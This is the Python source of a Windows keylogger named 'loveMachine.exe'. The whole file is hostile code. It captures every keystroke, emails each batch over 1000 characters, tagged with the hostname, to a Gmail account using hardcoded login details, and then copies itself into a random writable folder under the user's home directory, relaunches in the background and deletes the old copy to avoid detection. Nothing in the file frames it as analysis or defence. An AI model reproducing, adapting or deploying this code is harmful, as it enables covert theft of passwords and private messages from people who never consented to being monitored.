from pynput import keyboard
from pynput.keyboard import Key
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
import socket
import os
import random
import subprocess
import sys


try:
        buffer = 1000
        
        args = "\""+os.getcwd()+"\\loveMachine.exe\""
        if len(sys.argv) == 2:
                args = "\""+sys.argv[1] +"\" "+ args
        elif len(sys.argv) == 3:
                os.remove(sys.argv[1])
                args = "\""+sys.argv[2] + "\" " +args

        f = open('loveMachine.exe','rb').read()

        def jump(d):
                out = open(d+'/loveMachine.exe','wb')
                out.write(f)
                out.close()
                subprocess.call("START \"\" /B /D \""+d+"\" loveMachine.exe "+args, shell=True)
                os._exit(0)
                                
                
        def scan(d):
                try:
                        l = [os.path.join(d, x)
                                for x in os.listdir(d)
                                if all([os.access(os.path.join(d, x),cond)
                                        for cond in [os.F_OK, os.W_OK, os.X_OK, os.R_OK]])
                                and os.path.isdir(os.path.join(d, x))
                                ]
                        if len(l)==0:
                                jump(d)
                        scan(random.choice(l))
                except WindowsError:
                        scan(os.path.expanduser("~"))

        keysPressed = ''

        def send(body):
                addr = "notsuspiciousatall1337@gmail.com"
                msg = MIMEMultipart()
                msg['From'] = addr
                msg['To'] = addr
                msg['Subject'] = socket.gethostname()

                msg.attach(MIMEText(body, 'plain'))
                 
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.login("notsuspiciousatall1337", "Passtheword123")
                text = msg.as_string()
                server.sendmail(addr, addr, text)
                server.quit()



        def on_press(key):
                global keysPressed
                try:
                        keysPressed+=key.char
                except AttributeError:
                        if key == Key.space:
                                keysPressed+=" "
                        elif key == Key.enter:
                                keysPressed+="\n"
                if len(keysPressed)>buffer:
                        send(keysPressed)
                        keysPressed=''
                        scan(os.path.expanduser("~"))

        def start():
                with keyboard.Listener(on_press=on_press) as listener:
                        listener.join()

        start()
except:
        args = "\""+os.getcwd()+"\\loveMachine.exe\""
        subprocess.call("START \"\" /B /D \""+d+"\" loveMachine.exe "+args, shell=True)
